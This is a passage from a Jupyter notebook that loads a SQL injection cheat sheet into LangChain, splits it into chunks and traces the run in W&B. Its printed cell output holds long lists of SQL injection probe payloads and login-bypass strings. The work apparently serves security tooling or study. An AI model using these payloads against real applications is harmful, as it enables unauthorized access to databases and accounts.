SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- \\r\\n UNION ALL SELECT NULL#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#\\r\\n UNION ALL SELECT NULL \\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))\\r\\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))\\r\\n AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))\\r\\n AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)\\r\\n AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)\\r\\n UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\'\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\'-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\'#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\\r\\n UNION ALL SELECT \\'INJ\\'||\\'ECT\\'||\\'XXX\\',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\\r\\n```\\r\\n\\r\\n#### SQL Injection Auth Bypass Payloads\\r\\n\\r\\n```\\r\\n\\'-\\'\\r\\n\\' \\'\\r\\n\\'&\\'\\r\\n\\'^\\'\\r\\n\\'*\\'\\r\\n\\' or \\'\\'-\\'\\r\\n\\' or \\'\\' \\'\\r\\n\\' or \\'\\'&\\'\\r\\n\\' or \\'\\'^\\'\\r\\n\\' or \\'\\'*\\'\\r\\n\"-\"\\r\\n\" \"\\r\\n\"&\"\\r\\n\"^\"\\r\\n\"*\"\\r\\n\" or \"\"-\"\\r\\n\" or \"\" \"\\r\\n\" or \"\"&\"\\r\\n\" or \"\"^\"\\r\\n\" or \"\"*\"\\r\\nor true--\\r\\n\" or true--\\r\\n\\' or true--\\r\\n\") or true--\\r\\n\\') or true--\\r\\n\\' or \\'x\\'=\\'x\\r\\n\\') or (\\'x\\')=(\\'x\\r\\n\\')) or ((\\'x\\'))=((\\'x\\r\\n\" or \"x\"=\"x\\r\\n\") or (\"x\")=(\"x\\r\\n\")) or ((\"x\"))=((\"x\\r\\nor 1=1\\r\\nor 1=1--\\r\\nor 1=1#\\r\\nor 1=1/*\\r\\nadmin\\' --\\r\\nadmin\\' #\\r\\nadmin\\'/*\\r\\nadmin\\' or \\'1\\'=\\'1\\r\\nadmin\\' or \\'1\\'=\\'1\\'--\\r\\nadmin\\' or \\'1\\'=\\'1\\'#\\r\\nadmin\\' or \\'1\\'=\\'1\\'/*\\r\\nadmin\\'or 1=1 or \\'\\'=\\'\\r\\nadmin\\' or 1=1\\r\\nadmin\\' or 1=1--\\r\\nadmin\\' or 1=1#\\r\\nadmin\\' or 1=1/*\\r\\nadmin\\') or (\\'1\\'=\\'1\\r\\nadmin\\') or (\\'1\\'=\\'1\\'--\\r\\nadmin\\') or (\\'1\\'=\\'1\\'#\\r\\nadmin\\') or (\\'1\\'=\\'1\\'/*\\r\\nadmin\\') or \\'1\\'=\\'1\\r\\nadmin\\') or \\'1\\'=\\'1\\'--\\r\\nadmin\\') or \\'1\\'=\\'1\\'#\\r\\nadmin\\') or \\'1\\'=\\'1\\'/*\\r\\n1234 \\' AND 1=0 UNION ALL SELECT \\'admin\\', \\'81dc9bdb52d04dc20036dbd8313ed055\\r\\nadmin\" --\\r\\nadmin\" #\\r\\nadmin\"/*\\r\\nadmin\" or \"1\"=\"1\\r\\nadmin\" or \"1\"=\"1\"--\\r\\nadmin\" or \"1\"=\"1\"#\\r\\nadmin\" or \"1\"=\"1\"/*\\r\\nadmin\"or 1=1 or \"\"=\"\\r\\nadmin\" or 1=1\\r\\nadmin\" or 1=1--\\r\\nadmin\" or 1=1#\\r\\nadmin\" or 1=1/*\\r\\nadmin\") or (\"1\"=\"1\\r\\nadmin\") or (\"1\"=\"1\"--\\r\\nadmin\") or (\"1\"=\"1\"#\\r\\nadmin\") or (\"1\"=\"1\"/*\\r\\nadmin\") or \"1\"=\"1\\r\\nadmin\") or \"1\"=\"1\"--\\r\\nadmin\") or \"1\"=\"1\"#\\r\\nadmin\") or \"1\"=\"1\"/*\\r\\n1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055\\r\\n```\\r\\n\\r\\n#### References :\\r\\n\\r\\n* SQL Injection ( OWASP )\\r\\n\\r\\n👉 https://www.owasp.org/index.php/SQL_Injection\\r\\n\\r\\n* Blind SQL Injection\\r\\n\\r\\n👉 https://www.owasp.org/index.php/Blind_SQL_Injection\\r\\n\\r\\n* Testing for SQL Injection (OTG-INPVAL-005)\\r\\n\\r\\n👉 https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)\\r\\n\\r\\n* SQL Injection Bypassing WAF\\r\\n\\r\\n👉 https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF\\r\\n\\r\\n* Reviewing Code for SQL Injection\\r\\n\\r\\n👉 https://www.owasp.org/index.php/Reviewing_Code_for_SQL_Injection\\r\\n\\r\\n* PL/SQL:SQL Injection\\r\\n\\r\\n👉 https://www.owasp.org/index.php/PL/SQL:SQL_Injection\\r\\n\\r\\n* Testing for NoSQL injection\\r\\n\\r\\n👉 https://www.owasp.org/index.php/Testing_for_NoSQL_injection\\r\\n\\r\\n* SQL Injection Injection Prevention Cheat Sheet \\r\\n\\r\\n👉 https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html\\r\\n\\r\\n* SQL Injection Query Parameterization Cheat Sheet \\r\\n\\r\\n👉 https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html\\r\\n'"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data[0].page_content"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "def remove_html_tags(text):\n",
    "    clean = re.compile('<.*?>')\n",
    "    return re.sub(clean, '', text)\n",
    "\n",
    "data[0].page_content = remove_html_tags(data[0].page_content)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "# we need a single line of code to start tracing langchain with W&B\n",
    "os.environ[\"LANGCHAIN_WANDB_TRACING\"] = \"true\"\n",
    "\n",
    "# here we are configuring the wandb project name\n",
    "os.environ[\"WANDB_PROJECT\"] = \"sql-injection-tools\""
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Parsing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "18"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "md_text_splitter = MarkdownTextSplitter(chunk_size=4000, chunk_overlap=500)\n",
    "document_sections = md_text_splitter.split_documents(data)\n",
    "len(document_sections)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">|Out-of-band SQLi|Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled\n",
       "on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is     \n",
       "unable to use the same channel to launch the attack and gather results. Out-of-band techniques, offer an attacker  \n",
       "an alternative to inferential time-based techniques, especially if the server responses are not very stable (making\n",
       "an inferential time-based attack unreliable).| | Voice Based Sql Injection | It is a sql injection attack method   \n",
       "that can be applied in applications that provide access to databases with voice command. An attacker could pull    \n",
       "information from the database by sending sql queries with sound. |                                                 \n",
       "</pre>\n"
      ],
      "text/plain": [
